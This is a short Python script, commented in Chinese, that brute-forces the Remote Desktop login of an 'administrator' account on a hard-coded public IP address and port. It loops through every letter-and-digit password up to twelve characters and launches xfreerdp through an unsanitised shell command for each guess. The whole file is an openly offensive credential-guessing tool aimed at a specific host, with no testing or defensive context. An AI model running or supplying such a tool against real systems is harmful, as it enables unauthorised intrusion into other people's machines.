import itertools
import string
import os
 # RDP登录相关参数
RDP_HOST = "117.164.185.68"
RDP_PORT = "3164"
RDP_USERNAME = "administrator"
RDP_DOMAIN = ""
RDP_PASSWORD = ""
def try_rdp_login(password):
    # 使用xfreerdp进行RDP登录
    cmd = f"xfreerdp /v:{RDP_HOST}:{RDP_PORT} /u:{RDP_DOMAIN}\\{RDP_USERNAME} /p:{password} +auto-reconnect /cert-ignore"
    os.system(cmd)
def crack_rdp_password(length):
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for password in itertools.product(chars, repeat=length):
        password = "".join(password)
        print(f"Trying password: {password}")
        try_rdp_login(password)
if __name__ == "__main__":
    for length in range(1, 13):
        crack_rdp_password(length)
